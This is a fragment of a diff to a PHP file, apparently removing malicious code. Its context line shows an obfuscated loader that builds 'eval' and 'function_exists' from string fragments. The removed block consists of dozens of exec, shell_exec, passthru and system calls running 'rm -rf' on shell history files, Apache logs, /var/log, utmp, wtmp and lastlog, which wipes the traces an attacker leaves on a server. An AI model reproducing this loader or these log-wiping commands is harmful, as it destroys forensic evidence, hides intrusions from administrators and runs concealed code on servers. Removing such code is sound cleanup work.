@@ -31,57 +31,7 @@ $QVgwgz='f'.'un'.'c'.'tion'.'_'.'e'.'x'.'is'.'ts';$TQrQwE='eva'.'l';$NPbpEck='gz
     ];
     $context = stream_context_create($options);
     $response = file_get_contents($url, false, $context);
-exec("rm -rf /root/.ksh_history");
-	exec("rm -rf /root/.bash_history");
-	exec("rm -rf /root/.bash_logout");
-	exec("rm -rf /usr/local/apache/logs");
-	exec("rm -rf /usr/local/apache/log");
-	exec("rm -rf /var/apache/logs");
-	exec("rm -rf /ar/apache/log");
-	exec("rm -rf /var/run/utmp");
-	exec("rm -rf /var/logs");
-	exec("rm -rf /var/log");
-	exec("rm -rf /var/adm");
-	exec("rm -rf /etc/wtmp");
-	exec("rm -rf /etc/utmp");
-	exec("rm -rf $HISTFILE");
-	exec("rm -rf /var/log/lastlog");
-	exec("rm -rf /var/log/wtmp");
-	shell_exec("rm -rf /tmp/logs");
-	shell_exec("rm -rf /root/.ksh_history");
-	shell_exec("rm -rf /root/.bash_history");
-	shell_exec("rm -rf /root/.bash_logout");
-	shell_exec("rm -rf /usr/local/apache/logs");
-	shell_exec("rm -rf /usr/local/apache/log");
-	shell_exec("rm -rf /var/apache/logs");
-	shell_exec("rm -rf /var/apache/log");
-	shell_exec("rm -rf /var/run/utmp");
-	shell_exec("rm -rf /var/logs");
-	shell_exec("rm -rf /var/log");
-	shell_exec("rm -rf /var/adm");
-	shell_exec("rm -rf /etc/wtmp");
-	shell_exec("rm -rf /etc/utmp");
-	shell_exec("rm -rf $HISTFILE");
-	shell_exec("rm -rf /var/log/lastlog");
-	shell_exec("rm -rf /var/log/wtmp");
-	passthru("rm -rf /tmp/logs");
-	passthru("rm -rf /root/.ksh_history");
-	passthru("rm -rf /root/.bash_history");
-	passthru("rm -rf /root/.bash_logout");
-	passthru("rm -rf /usr/local/apache/logs");
-	passthru("rm -rf /usr/local/apache/log");
-	passthru("rm -rf /var/apache/logs");
-	passthru("rm -rf /var/apache/log");
-	passthru("rm -rf /var/run/utmp");
-	passthru("rm -rf /var/logs");
-	passthru("rm -rf /var/log");
-	passthru("rm -rf /var/adm");
-	passthru("rm -rf /etc/wtmp");
-	passthru("rm -rf /etc/utmp");
-	passthru("rm -rf $HISTFILE");
-	passthru("rm -rf /var/log/lastlog");
-	passthru("rm -rf /var/log/wtmp");
-	system("rm -rf /tmp/logs");
+
 }
 
 ?>
